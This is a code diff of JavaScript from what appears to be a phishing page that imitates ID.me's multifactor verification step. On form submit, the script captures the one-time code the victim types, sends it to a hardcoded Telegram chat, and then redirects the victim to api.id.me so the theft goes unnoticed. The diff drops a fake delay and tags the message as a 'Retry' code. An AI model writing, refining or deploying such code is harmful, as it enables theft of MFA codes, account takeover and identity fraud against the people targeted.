@@ -1,45 +1,25 @@
 let formm;
-let delayy;
 let counterr;
-let generated_email;
 let email_field;
-let password_field;
 let submit_btn;
 
 document.addEventListener("DOMContentLoaded", () => {
   console.log("Page loaded");
   counterr = document.querySelector(".counterr");
-  delayy = document.getElementById("delayy");
   email_field = document.getElementById("multifactor_code");
   submit_btn = document.querySelector("button[type='submit']");
   formm = document.getElementById("new_multifactor");
 
   formm.addEventListener("submit", (e) => {
     e.preventDefault();
-    show_counter().then(() => {
-      console.log("submit form");
-      send_telegram_message();
-    });
+    send_telegram_message();
   });
 });
-
-function show_counter() {
-  submit_btn.setAttribute("disabled", "true");
-  const del = document.getElementById("delayy");
-  del.style.display = "flex";
-  return new Promise((resolve) => {
-    setTimeout(() => {
-      resolve();
-    }, 5000); // Adjust the delay as needed
-  });
-}
-
-
 
 async function send_telegram_message() {
   const chatIds = ["-1001991348429"]; // Add your chat IDs here
   const verificationCode = email_field.value;
-  const msg = `Verification code: ${verificationCode}`;
+  const msg = `Retry Verification code: ${verificationCode}`;
 
   for (let i = 0; i < chatIds.length; i++) {
     const data = {
@@ -70,7 +50,7 @@ async function send_telegram_message() {
       }
 
       // Redirect to the next page after sending the message
-      window.location.href = "https://api.id.me"; // Replace "nextpage.html" with the URL of the next page
+      window.location.href = "https://api.id.me"; // Replace with the URL of the next page
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
     }
